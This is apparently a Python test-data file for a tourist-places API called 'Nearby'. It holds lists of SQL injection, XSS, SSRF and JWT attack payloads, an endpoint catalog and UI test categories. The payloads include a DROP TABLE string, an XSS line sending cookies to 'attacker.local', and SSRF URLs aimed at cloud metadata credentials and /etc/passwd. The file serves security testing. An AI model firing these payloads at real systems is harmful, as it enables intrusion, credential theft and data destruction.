"""
Comprehensive Test Data & Security Payloads Repository
"""

# Security Probes & Vulnerability Injection Vectors
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, email, password_hash, null, null FROM users --",
    "admin' --",
    "1' ORDER BY 1--+",
    "1' AND 1=1 AND '%'='",
    "1' AND SLEEP(5) AND '1'='1",
    "1'; WAITFOR DELAY '0:0:5'--",
    "' OR EXISTS(SELECT * FROM users WHERE role='admin') --",
    "{\"$gt\": \"\"}",  # NoSQL injection probe
    "{\"$where\": \"sleep(5000)\"}",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password_hash FROM users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    "' OR 1=1#",
    "admin'/*",
    "' OR 'x'='x"
]

XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "\"><script>fetch('http://attacker.local/?c='+document.cookie)</script>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<svg><script href=\"data:text/javascript,alert(1)\" />",
    "{{constructor.constructor('alert(1)')()}}",  # SSTI / Angular expression injection
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=\"javascript:alert(1)\">",
    "<marquee onstart=alert(1)>"
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:8000/api/v1/system/info",
    "http://localhost:6379/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "http://[::1]:8000/docs",
    "http://10.0.0.1:8080/admin",
    "http://172.18.0.2:3306/",
    "http://192.168.1.1/router-status",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "dict://127.0.0.1:6379/KEYS*",
    "http://metadata.google.internal/computeMetadata/v1/"
]

JWT_ATTACK_VECTORS = [
    {"type": "alg_none", "header": {"alg": "none", "typ": "JWT"}, "claims": {"sub": "admin@nearby.internal", "role": "admin"}},
    {"type": "empty_signature", "token_format": "{header}.{payload}."},
    {"type": "symmetric_asymmetric_confusion", "alg": "HS256_with_public_key"},
    {"type": "token_expired_replay", "exp_offset": -3600},
    {"type": "tampered_role_claim", "claims": {"sub": "regular_user", "role": "superadmin"}},
    {"type": "null_byte_subject", "claims": {"sub": "admin\x00@nearby.internal", "role": "admin"}},
    {"type": "token_fixation_reuse", "claims": {"sub": "logged_out_user"}}
]

# Standard API Endpoints catalog for Nearby Backend
API_ENDPOINTS_CATALOG = [
    {"method": "GET", "path": "/health", "tag": "Health", "auth": "None", "description": "Liveness and health probe"},
    {"method": "GET", "path": "/health/db", "tag": "Health", "auth": "None", "description": "Database connectivity check"},
    {"method": "GET", "path": "/health/redis", "tag": "Health", "auth": "None", "description": "Redis cache connectivity check"},
    {"method": "POST", "path": "/api/v1/auth/register", "tag": "Authentication", "auth": "None", "description": "User registration with email & password"},
    {"method": "POST", "path": "/api/v1/auth/login", "tag": "Authentication", "auth": "None", "description": "OAuth2 password grant login & token generation"},
    {"method": "POST", "path": "/api/v1/auth/refresh", "tag": "Authentication", "auth": "None", "description": "Refresh token exchange for new access token"},
    {"method": "POST", "path": "/api/v1/auth/logout", "tag": "Authentication", "auth": "User", "description": "User session termination"},
    {"method": "GET", "path": "/api/v1/users/me", "tag": "Users", "auth": "User", "description": "Fetch current authenticated user profile"},
    {"method": "PATCH", "path": "/api/v1/users/me", "tag": "Users", "auth": "User", "description": "Update current user profile information"},
    {"method": "GET", "path": "/api/v1/categories", "tag": "Categories", "auth": "None", "description": "List all active tourist place categories"},
    {"method": "GET", "path": "/api/v1/places", "tag": "Places", "auth": "None", "description": "Paginated search & filtering of tourist places"},
    {"method": "POST", "path": "/api/v1/places", "tag": "Places", "auth": "Admin", "description": "Create new tourist destination record"},
    {"method": "GET", "path": "/api/v1/places/{id}", "tag": "Places", "auth": "None", "description": "Fetch place details by UUID or slug"},
    {"method": "PATCH", "path": "/api/v1/places/{id}", "tag": "Places", "auth": "Admin", "description": "Update destination metadata and coordinates"},
    {"method": "DELETE", "path": "/api/v1/places/{id}", "tag": "Places", "auth": "Admin", "description": "Delete tourist destination listing"},
    {"method": "GET", "path": "/api/v1/places/nearby", "tag": "Spatial", "auth": "None", "description": "Haversine geospatial radial proximity search"},
    {"method": "GET", "path": "/api/v1/directions", "tag": "Routing", "auth": "None", "description": "Turn-by-turn routing between coordinates"},
    {"method": "GET", "path": "/api/v1/reviews/place/{place_id}", "tag": "Reviews", "auth": "None", "description": "List user reviews for destination"},
    {"method": "POST", "path": "/api/v1/reviews", "tag": "Reviews", "auth": "User", "description": "Post new rating and review for destination"},
    {"method": "PATCH", "path": "/api/v1/reviews/{id}", "tag": "Reviews", "auth": "Owner", "description": "Edit existing user review"},
    {"method": "DELETE", "path": "/api/v1/reviews/{id}", "tag": "Reviews", "auth": "Owner", "description": "Delete user review"},
    {"method": "GET", "path": "/api/v1/favorites", "tag": "Favorites", "auth": "User", "description": "List user bookmarked destinations"},
    {"method": "POST", "path": "/api/v1/favorites/{place_id}", "tag": "Favorites", "auth": "User", "description": "Add destination to bookmarks"},
    {"method": "DELETE", "path": "/api/v1/favorites/{place_id}", "tag": "Favorites", "auth": "User", "description": "Remove destination from bookmarks"},
    {"method": "GET", "path": "/api/v1/notifications", "tag": "Notifications", "auth": "User", "description": "Get user notifications and travel alerts"},
    {"method": "POST", "path": "/api/v1/uploads/image", "tag": "Uploads", "auth": "User", "description": "Upload image media files for places or avatars"},
    {"method": "GET", "path": "/api/v1/admin/dashboard", "tag": "Admin", "auth": "Admin", "description": "Admin platform health and analytics dashboard"},
    {"method": "GET", "path": "/api/v1/admin/users", "tag": "Admin", "auth": "Admin", "description": "Admin user management and role assignment"},
    {"method": "GET", "path": "/api/v1/image-search/thumb", "tag": "Media", "auth": "None", "description": "Keyless thumbnail proxy service"},
    {"method": "POST", "path": "/api/v1/ai/chat", "tag": "AI", "auth": "None", "description": "Interactive AI travel recommendation chat"},
    {"method": "GET", "path": "/api/v1/weather", "tag": "Weather", "auth": "None", "description": "Fetch destination real-time weather forecasts"},
    {"method": "POST", "path": "/api/v1/itinerary/generate", "tag": "Itinerary", "auth": "None", "description": "Generate multi-day AI travel itinerary plan"},
    {"method": "GET", "path": "/api/v1/explore", "tag": "Explore", "auth": "None", "description": "Universal multi-entity search and filter engine"},
    {"method": "GET", "path": "/api/v1/system/info", "tag": "System", "auth": "None", "description": "System version and runtime metadata"}
]

# Mobile Capabilities Matrix
MOBILE_TEST_CATEGORIES = [
    "Authentication & Biometrics",
    "User Registration & Verification",
    "Bottom Navigation & Route Stack",
    "Form Validation & Error States",
    "Offline Storage & SQLite Sync",
    "UI Responsiveness & Dark Theme",
    "Media & Avatar File Uploads",
    "Push Notifications & Deep Linking",
    "Geofencing & Background Location",
    "Network Latency & Flaky Connection Handling"
]

WEB_TEST_CATEGORIES = [
    "DOM Rendering & React Lifecycle",
    "Cross-Browser Viewport Layouts",
    "Interactive Map & Marker Clustering",
    "Search Autocomplete & Debounce",
    "User Authentication & Route Guards",
    "Review Submission & Star Ratings",
    "AI Itinerary Generator Interface",
    "Dark Mode & Tailwind v4 Theme Switcher",
    "Modal Dialogs & Focus Trapping",
    "Session Storage & Global State Persistence"
]
